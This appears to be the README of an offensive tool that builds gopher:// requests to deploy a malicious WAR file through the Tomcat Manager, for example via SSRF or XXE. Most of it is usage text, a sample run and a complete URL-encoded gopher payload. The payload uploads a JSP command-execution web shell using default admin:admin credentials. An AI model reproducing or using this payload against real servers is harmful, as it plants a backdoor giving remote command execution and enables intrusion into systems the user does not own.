# Gopher Tomcat Deployer

## Video

[![Video](http://img.youtube.com/vi/PQDZlYN0cAk/0.jpg)](http://www.youtube.com/watch?v=PQDZlYN0cAk "XXE to RCE with gopher")


## Usage

```
$ python gopher-tomcat-deployer.py -h
=============================================================================
|                        GOPHER TOMCAT DEPLOYER v0.1                        |
|                              by pimps and alec                            |
=============================================================================

usage: gopher-tomcat-deployer.py [-h] [-o OUTPUT] [-u USER] [-p PASSWORD]
                                 [-t TARGET] [-pt PORT]
                                 webshell

positional arguments:
  webshell                          Path to a .jsp web backdoor

optional arguments:
  -h, --help                        show this help message and exit
  -o OUTPUT, --output OUTPUT        Output file name (default: cmd.war)
  -u USER, --user USER              Tomcat user (default: admin)
  -p PASSWORD, --password PASSWORD  Tomcat password (default: admin)
  -t TARGET, --target TARGET        Target Tomcat IP address (default =
                                    127.0.0.1)
  -pt PORT, --port PORT             Target Tomcat port (default = 8080)

This script will generate a GOPHER request to deploy a malicious application
in the Tomcat Manager. The GOPHER protocol is ASCII only and this script makes
sure that the generated malicious war file will properly work when deployed.
This script was tested against Tomcat 6.

```

```
$ python gopher-tomcat-deployer.py -u admin -p admin -t 127.0.0.1 -pt 8080 cmd.jsp

=============================================================================
|                        GOPHER TOMCAT DEPLOYER v0.1                        |
|                              by pimps and alec                            |
=============================================================================

Original file length: 00000360
Original file crc32: f724925e
The input file CRC32 or file length contained an invalid byte.
Length adjustment completed. 2 whitespace ' ' chars were added to the webshell input.
New file length: 00000362
New file crc32: d50a6303
[+] Creating new zip file: cmd.war
[+] Validating created war file... cmd.war
[-] Invalid checksum/offset found in zip file. Adding white space and trying again...
Original file length: 00000363
Original file crc32: 70b0949c
The input file CRC32 or file length contained an invalid byte.
Length adjustment completed. 2 whitespace ' ' chars were added to the webshell input.
New file length: 00000365
New file crc32: c5a5f46e
[+] Creating new zip file: cmd.war
[+] Validating created war file... cmd.war
[-] Invalid checksum/offset found in zip file. Adding white space and trying again...
Original file length: 00000366
Original file crc32: 43a326ee
[+] Creating new zip file: cmd.war
[+] Validating created war file... cmd.war
[-] Invalid checksum/offset found in zip file. Adding white space and trying again...
Original file length: 00000367
Original file crc32: ae9da31c
The input file CRC32 or file length contained an invalid byte.
Length adjustment completed. 1 whitespace ' ' chars were added to the webshell input.
New file length: 00000368
New file crc32: fdc30ea9
[+] Creating new zip file: cmd.war
[+] Validating created war file... cmd.war
[-] Invalid checksum/offset found in zip file. Adding white space and trying again...

[ SNIP FOR BREVITY ]

Original file length: 000003FA
Original file crc32: 83d9dad0
The input file CRC32 or file length contained an invalid byte.
Length adjustment completed. 1 whitespace ' ' chars were added to the webshell input.
New file length: 000003FB
New file crc32: 6f3cc44b
[+] Creating new zip file: cmd.war
[+] Validating created war file... cmd.war
[-] Invalid checksum/offset found in zip file. Adding white space and trying again...
Original file length: 000003FC
Original file crc32: 80d6b99
The input file CRC32 or file length contained an invalid byte.
Length adjustment completed. 4 whitespace ' ' chars were added to the webshell input.
New file length: 00000400
New file crc32: 286e4e38
[+] Creating new zip file: cmd.war
[+] Validating created war file... cmd.war
[+] Valid WAR file generated... Creating the gopher payload now...
[+] Payload generated with success:
------------------------------------------------------------------------
gopher://127.0.0.1:8080/_%50%4f%53%54%20%2f%6d%61%6e%61%67%65%72%2f%68%74%6d%6c%2f%75%70%6c%6f%61%64%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%3a%38%30%38%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%3b%20%62%6f%75%6e%64%61%72%79%3d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%31%35%31%30%33%32%31%34%32%39%37%31%35%35%34%39%36%36%33%33%33%34%37%36%32%38%34%31%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%33%37%30%0d%0a%41%75%74%68%6f%72%69%7a%61%74%69%6f%6e%3a%20%42%61%73%69%63%20%59%57%52%74%61%57%34%36%59%57%52%74%61%57%34%3d%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%0d%0a%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%31%35%31%30%33%32%31%34%32%39%37%31%35%35%34%39%36%36%33%33%33%34%37%36%32%38%34%31%0d%0a%43%6f%6e%74%65%6e%74%2d%44%69%73%70%6f%73%69%74%69%6f%6e%3a%20%66%6f%72%6d%2d%64%61%74%61%3b%20%6e%61%6d%65%3d%22%64%65%70%6c%6f%79%57%61%72%22%3b%20%66%69%6c%65%6e%61%6d%65%3d%22%63%6d%64%2e%77%61%72%22%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6f%63%74%65%74%2d%73%74%72%65%61%6d%0d%0a%0d%0a%50%4b%03%04%14%00%00%00%00%00%00%00%21%00%38%4e%6e%28%00%04%00%00%00%04%00%00%07%00%00%00%63%6d%64%2e%6a%73%70%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%0d%0a%3c%25%0d%0a%2f%2f%0d%0a%2f%2f%20%4a%53%50%5f%4b%49%54%0d%0a%2f%2f%0d%0a%2f%2f%20%63%6d%64%2e%6a%73%70%20%3d%20%43%6f%6d%6d%61%6e%64%20%45%78%65%63%75%74%69%6f%6e%20%28%75%6e%69%78%29%0d%0a%2f%2f%0d%0a%2f%2f%20%62%79%3a%20%55%6e%6b%6e%6f%77%6e%0d%0a%2f%2f%20%6d%6f%64%69%66%69%65%64%3a%20%32%37%2f%30%36%2f%32%30%30%33%0d%0a%2f%2f%0d%0a%25%3e%0d%0a%3c%48%54%4d%4c%3e%3c%42%4f%44%59%3e%0d%0a%3c%46%4f%52%4d%20%4d%45%54%48%4f%44%3d%22%47%45%54%22%20%4e%41%4d%45%3d%22%6d%79%66%6f%72%6d%22%20%41%43%54%49%4f%4e%3d%22%22%3e%0d%0a%3c%49%4e%50%55%54%20%54%59%50%45%3d%22%74%65%78%74%22%20%4e%41%4d%45%3d%22%63%6d%64%22%3e%0d%0a%3c%49%4e%50%55%54%20%54%59%50%45%3d%22%73%75%62%6d%69%74%22%20%56%41%4c%55%45%3d%22%53%65%6e%64%22%3e%0d%0a%3c%2f%46%4f%52%4d%3e%0d%0a%3c%70%72%65%3e%0d%0a%3c%25%0d%0a%69%66%20%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%43%6f%6d%6d%61%6e%64%3a%20%22%20%2b%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%20%2b%20%22%3c%42%52%3e%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%4f%75%74%70%75%74%53%74%72%65%61%6d%20%6f%73%20%3d%20%70%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%20%64%69%73%20%3d%20%6e%65%77%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%28%69%6e%29%3b%0d%0a%20%20%20%20%20%20%20%20%53%74%72%69%6e%67%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%77%68%69%6c%65%20%28%20%64%69%73%72%20%21%3d%20%6e%75%6c%6c%20%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%64%69%73%72%29%3b%20%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%25%3e%0d%0a%3c%2f%70%72%65%3e%0d%0a%3c%2f%42%4f%44%59%3e%3c%2f%48%54%4d%4c%3e%0d%0a%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%50%4b%01%02%14%03%14%00%00%00%00%00%00%00%21%00%38%4e%6e%28%00%04%00%00%00%04%00%00%07%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%6d%64%2e%6a%73%70%50%4b%05%06%00%00%00%00%01%00%01%00%35%00%00%00%25%04%00%00%00%00%0d%0a%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%31%35%31%30%33%32%31%34%32%39%37%31%35%35%34%39%36%36%33%33%33%34%37%36%32%38%34%31%2d%2d%0d%0a
------------------------------------------------------------------------
HACK THE PLANET!!1!11!
```

